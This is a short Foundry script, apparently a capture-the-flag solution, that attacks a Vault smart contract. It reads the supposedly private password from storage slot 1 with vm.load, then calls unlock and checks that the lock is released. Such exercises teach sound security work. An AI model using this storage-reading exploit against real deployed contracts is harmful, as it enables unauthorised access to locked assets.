// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address vaultAddress = vm.envAddress("VAULT_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        Vault vault = Vault(vaultAddress);
        bytes32 password = vm.load(vaultAddress, bytes32(uint256(1)));
        vault.unlock(password);
        require(!vault.locked(), "attack failed");
        vm.stopBroadcast();
    }
}
